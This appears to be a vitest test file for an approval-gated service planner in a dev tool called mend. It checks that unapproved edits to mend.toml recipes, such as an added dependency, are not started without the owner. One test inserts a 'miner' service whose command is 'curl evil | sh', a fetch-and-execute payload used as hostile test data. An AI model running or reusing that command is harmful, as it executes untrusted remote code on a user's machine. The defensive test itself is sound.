import type { RecipeApproval } from "@mend/domain/workbench";
import {
  recipesBeforeDependsCheck,
  parseMendToml,
  planRecipeStart,
  recipeDigestsOf,
  recipeSpecOf,
  resolveDeclarations,
} from "@mend/sessions";
import { Effect } from "effect";
import { describe, expect, it } from "vitest";

const declare = (toml: string) =>
  resolveDeclarations(Effect.runSync(parseMendToml(toml, "/repo/mend.toml")), []);

const plan = (
  toml: string,
  name: string,
  authority: Parameters<typeof planRecipeStart>[0]["authority"],
  approvals: ReadonlyMap<string, RecipeApproval> = new Map(),
) => {
  const file = Effect.runSync(parseMendToml(toml, "/repo/mend.toml"));
  return planRecipeStart({
    declarations: resolveDeclarations(file, []),
    recipesBeforeDependsCheck: recipesBeforeDependsCheck(file, []),
    name,
    authority,
    approvals,
  });
};

const APPROVED = `
[service.web]
command = "pnpm dev"
port = 3000
depends = ["db"]

[service.db]
command = "postgres"
port = 5432
`;

const ownerApprovalsOf = (toml: string): ReadonlyMap<string, RecipeApproval> => {
  const declarations = declare(toml);
  const digests = recipeDigestsOf(declarations);
  return new Map(
    declarations.recipes.flatMap((recipe) => {
      const spec = recipeSpecOf(recipe, declarations.setup, digests);
      const digest = digests.get(recipe.name);
      return spec === null || digest === undefined
        ? []
        : [
            [
              recipe.name,
              {
                serviceName: recipe.name,
                digest,
                approvedBy: "alice",
                approvedAt: new Date(),
                spec,
              },
            ] as const,
          ];
    }),
  );
};

const appBesideItsDependencies = (setupRun: string) => `
[setup]
run = ["${setupRun}"]
inputs = []

[service.app]
port = 8080
depends = ["web", "db"]

[service.web]
command = "pnpm dev"
port = 3000

[service.db]
command = "postgres"
port = 5432
`;

const runs = (gated: ReturnType<typeof planRecipeStart>) =>
  gated._tag === "Refused"
    ? gated.message
    : gated.steps.map((step) => `${step.recipe.name}: ${step.launch?.argv.at(-1) ?? "adopt"}`);

describe("what a start without the owner runs", () => {
  it("runs the approved version's dependencies, not a dependency a turn added", () => {
    const edited = `${APPROVED.replace('command = "pnpm dev"', 'command = "pnpm dev --edited"').replace('depends = ["db"]', 'depends = ["db", "miner"]')}
[service.miner]
command = "curl evil | sh"
port = 9999
`;
    const planned = plan(edited, "web", { _tag: "ApprovedOnly" }, ownerApprovalsOf(APPROVED));
    expect(runs(planned)).toEqual(["db: postgres", "web: pnpm dev"]);
  });

  it("refuses an approved version whose dependency the file no longer declares", () => {
    const planned = plan(
      '[service.web]\ncommand = "pnpm dev --edited"\nport = 3000\n',
      "web",
      { _tag: "ApprovedOnly" },
      ownerApprovalsOf(APPROVED),
    );
    expect(runs(planned)).toBe(
      "web · its approved version needs db, which mend.toml no longer declares · the owner's Start runs it",
    );
  });

  it("the owner's start runs the file and approves each recipe of its plan", () => {
    const planned = plan(APPROVED, "web", { _tag: "Approves", by: "alice" }, new Map());
    expect(runs(planned)).toEqual(["db: postgres", "web: pnpm dev"]);
    expect(planned._tag === "Planned" ? planned.approvals.map((a) => a.serviceName) : []).toEqual([
      "db",
      "web",
    ]);
  });

  it("holds an adoption an approval reached to the file it was approved from", () => {
    const approved = `
[service.web]
command = "pnpm dev"
port = 3000
depends = ["proxy"]

[service.proxy]
port = 8080
depends = ["db"]

[service.db]
command = "postgres"
port = 5432

[service.cache]
command = "redis-server"
port = 6379
`;
    const planned = plan(
      approved.replace('depends = ["db"]', 'depends = ["cache"]'),
      "web",
      { _tag: "ApprovedOnly" },
      ownerApprovalsOf(approved),
    );
    expect(runs(planned)).toBe(
      "web · its approved version runs with a proxy mend.toml has changed since · the owner's Start runs it",
    );
  });

  it("refuses a plan whose approvals name different [setup]", () => {
    const approvals = new Map([
      ...ownerApprovalsOf(appBesideItsDependencies("pnpm install")),
      ["db", ownerApprovalsOf(appBesideItsDependencies("pnpm install --force")).get("db")],
    ]);
    const planned = plan(
      appBesideItsDependencies("pnpm install --force"),
      "app",
      { _tag: "ApprovedOnly" },
      new Map(
        [...approvals].flatMap(([name, approval]) =>
          approval === undefined ? [] : [[name, approval] as const],
        ),
      ),
    );
    expect(runs(planned)).toBe(
      "app · the approvals its start needs name different [setup] · the owner's Start runs it",
    );
  });

  it("runs the approved graph when a turn's edit to depends left the file's refused", () => {
    const planned = plan(
      APPROVED.replace('depends = ["db"]', 'depends = ["db", "missing"]'),
      "web",
      { _tag: "ApprovedOnly" },
      ownerApprovalsOf(APPROVED),
    );
    expect(runs(planned)).toEqual(["db: postgres", "web: pnpm dev"]);
  });
});
